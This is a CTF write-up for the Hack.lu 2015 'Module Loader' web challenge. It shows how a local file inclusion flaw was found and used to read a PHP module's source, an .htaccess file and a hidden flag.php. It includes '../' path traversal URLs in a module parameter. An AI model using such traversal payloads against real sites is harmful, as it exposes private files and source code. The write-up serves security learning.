---
title: "Module Loader Web100 - HACK LU CTF 2015"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "lfi", "module", "loader", "web100", "web-exploitation"]
summary: "web writeup for \"Module Loader Web100\" from HACK LU CTF - techniques: lfi, module, loader, web100, web-exploitation."
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2015/HACK.LU_CTF_2015/Module_Loader_Web100_writeup.md"
ctf:
  name: "HACK LU CTF"
  year: 2015
  challenge: "Module Loader Web100"
---

## Source

- **CTF:** HACK LU CTF 2015
- **Challenge:** Module Loader Web100
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2015/HACK.LU_CTF_2015/Module_Loader_Web100_writeup.md>

---
# Hack.lu CTF 2015 - Module Loader (Web, 100pts)

## Problem

100 Points by lucebac (Web)

Since his students never know what date it is and how much time they have until the next homework's deadline, Mr P. H. Porter wrote a little webapp for that.


## Solution

We get simple web application with two available options:

![Welcome screen](https://github.com/bl4de/ctf/blob/master/2015/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader1.png)

After quick research there's an obvious LFI (Local File Include)

![LFI](https://github.com/bl4de/ctf/blob/master/2015/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader2.png)

We can include any file using url:

```
school.fluxfingers.net:1522/?module=../modules/timer
```

And here's source code of _timer_ module - it's just printed out, PHP code is not executed here:

```php
<?php 
if (isset($_GET['time']))
    $tmp = explode("-", $_GET['time']);
else
    $tmp = array(1970, 1, 1);
$y = (int)$tmp[0];
$m = (int)$tmp[1];
$d = (int)$tmp[2];
?>
<div id="clock"></div>
<!-- <script src="countdown.js"></script> -->
<script>
var clock = document.getElementById("clock");
var now = new Date();
clock.innerHTML = countdown(new Date(<?= $y; ?>, <?= $m; ?>, <?= $d; ?>)).toString();
setInterval(function(){clock.innerHTML = countdown(new Date(<?= $y; ?>, <?= $m; ?>, <?= $d ?>)).toString();}, 1000);
</script>

```

Also, we can display _.htaccess_, which contains some directory with quite "obvious" name :P

```
<!--
# seems to be not working, though
#<Directory "3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae">
#    Options -Indexes
#</Directory>
# -->
```

Let's take a look there and here we go:

![3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae content](https://github.com/bl4de/ctf/blob/master/2015/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader3.png)


Last thing is to use LFI and see, what's in flag.php file:

![Flag](https://github.com/bl4de/ctf/blob/master/2015/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader4.png)


school.fluxfingers.net:1522/?module=../3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae/flag.php
